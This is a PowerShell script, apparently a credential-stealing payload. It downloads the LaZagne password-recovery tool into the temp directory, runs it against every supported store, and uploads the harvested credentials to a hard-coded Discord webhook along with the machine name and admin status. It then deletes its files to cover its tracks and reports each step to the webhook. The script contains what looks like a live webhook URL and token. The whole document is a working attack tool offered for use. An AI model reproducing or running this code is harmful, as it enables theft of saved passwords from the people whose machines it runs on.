# Define variables
$webhook = "https://discord.com/api/webhooks/1237789574537810121/W_2CZivcnqxnt2gJuBj1eTf9w_8J7Wqvqs2pdjafWCXF4Yfu7w-DWjhRCW1Aaq0LQ7tn"
$version = "2.4.6"
$tempDir = "$env:TEMP\LaZagne"
$logFile = "$tempDir\output.txt"
$downloadUrl = "https://github.com/AlessandroZ/LaZagne/releases/download/v$version/LaZagne.exe"
$laZagnePath = "$tempDir\LaZagne.exe"

# Function to send a message to Discord for logging
function Send-DiscordMessage($message) {
    if ($message -and $message.Trim() -ne "") {
        $payload = @{
            username = "$env:COMPUTERNAME"
            content = $message
        }
        try {
            Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json)
        } catch {
            Write-Host "Failed to send message to Discord: $_"
        }
    } else {
        Write-Host "Skipped sending empty message to Discord."
    }
}

# Start of the script
Send-DiscordMessage "Step 1: Starting Lazagne script execution."

# Check if running as Administrator
$IsAdmin = [Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Send-DiscordMessage "Step 2: Admin check completed. IsAdmin = $IsAdmin"

# Create the temp directory if it does not exist
if (-not (Test-Path -Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir
    Send-DiscordMessage "Step 3: Temp directory created at $tempDir."
} else {
    Send-DiscordMessage "Step 3: Temp directory already exists at $tempDir."
}

# Download LaZagne.exe
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $laZagnePath
    Send-DiscordMessage "Step 4: Downloaded LaZagne.exe to $laZagnePath."
} catch {
    Send-DiscordMessage "Step 4: Failed to download LaZagne.exe. Error: $_"
}

# Run LaZagne and save the output to the log file
try {
    & $laZagnePath all > $logFile
    Send-DiscordMessage "Step 5: LaZagne executed. Output saved to $logFile."
} catch {
    Send-DiscordMessage "Step 5: Failed to execute LaZagne. Error: $_"
}

# Send the log file to the Discord webhook
try {
    $payload = @{
        username = "$env:COMPUTERNAME"
        content = "Step 6: New File Uploaded! (Admin: $IsAdmin)"
    }
    Invoke-RestMethod -Uri $webhook -Method Post -Form @{ "payload_json" = $payload | ConvertTo-Json; "file" = Get-Item $logFile }
    Send-DiscordMessage "Step 6: Log file uploaded successfully."
} catch {
    Send-DiscordMessage "Step 6: Failed to upload log file. Error: $_"
}

# Clean up: Remove the temp directory and its contents
try {
    Remove-Item -Path $tempDir -Recurse -Force
    Send-DiscordMessage "Step 7: Temp directory cleaned up."
} catch {
    Send-DiscordMessage "Step 7: Failed to clean up temp directory. Error: $_"
}

# End of the script
Send-DiscordMessage "Step 8: Lazagne script execution completed."
